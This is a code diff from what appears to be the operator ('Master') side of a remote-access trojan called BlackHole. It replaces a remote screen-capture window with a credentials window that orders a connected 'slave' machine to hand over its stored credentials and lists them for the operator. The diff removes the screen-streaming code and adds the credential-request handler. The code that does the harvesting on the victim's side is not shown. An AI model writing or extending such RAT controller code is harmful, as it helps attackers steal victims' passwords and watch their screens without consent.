@@ -1,4 +1,5 @@
 ﻿using System.IO;
+using System.Linq;
 using System.Windows;
 using System.Windows.Media.Imaging;
 using BlackHole.Common;
@@ -8,7 +9,7 @@ using BlackHole.Master.Extentions;
 namespace BlackHole.Master
 {
     /// <summary>
-    /// Logique d'interaction pour RemoteDesktop.xaml
+    /// 
     /// </summary>
     public partial class CredentialsWindow : SlaveWindow
     {
@@ -25,69 +26,13 @@ namespace BlackHole.Master
             : base(slave)
         {
             InitializeComponent();
-
-            // in case we leave the window withouth stopping
-            Closing += (s, e) => StopCapture();
         }
 
         /// <summary>
         /// 
         /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void OnStartCapture(object sender, RoutedEventArgs e) =>
-            StartCapture(0, int.Parse(TxtBoxQuality.Text), int.Parse(TxtBoxRate.Text));
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="sender"></param>
-        /// <param name="e"></param>
-        private void OnStopCapture(object sender, RoutedEventArgs e) => StopCapture();
-
-        /// <summary>
-        /// 
-        /// </summary>
-        private void StartCapture(int screen = 0, int quality = 10, int rate = 10) => Send(new StartScreenCaptureMessage
-        {
-            Quality = quality,
-            Rate = rate,
-            ScreenNumber = screen
-        });
-
-        /// <summary>
-        /// 
-        /// </summary>
-        private void StopCapture() => Send(new StopScreenCaptureMessage());
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="message"></param>
-        private void UpdateScreenCapture(ScreenCaptureMessage message)
-        {
-            if (ScreenCaptureImage.Source != null)
-                ((BitmapImage)ScreenCaptureImage.Source).StreamSource.Dispose();
-            ScreenCaptureImage.Source = BitmapToImageSource(message.RawImage);
-        }
-
-        /// <summary>
-        /// 
-        /// </summary>
-        /// <param name="rawData"></param>
-        /// <returns></returns>
-        private BitmapImage BitmapToImageSource(byte[] rawData)
-        {
-            using (var stream = new MemoryStream(rawData))
-            {
-                var bitmapimage = new BitmapImage();
-                bitmapimage.BeginInit();
-                bitmapimage.StreamSource = stream;
-                bitmapimage.CacheOption = BitmapCacheOption.OnLoad;
-                bitmapimage.EndInit();
-                return bitmapimage;
-            }
-        }
+        private void GetCredentials(object sender, RoutedEventArgs routedEventArgs) => 
+            Send(new StartCredentialsMessage());
 
         /// <summary>
         /// 
@@ -102,7 +47,11 @@ namespace BlackHole.Master
                 {
                     case SlaveEventType.IncommingMessage:
                     {
-                        ev.Data.Match().With<ScreenCaptureMessage>(UpdateScreenCapture);
+                        ev.Data.Match()
+                            .With<CredentialsMessage>(message =>
+                            {
+                                CredentialsList.ItemsSource = message.Credentials.Select(c => c.Dictionary).ToArray();
+                            });
                         break;
                     }
                 }
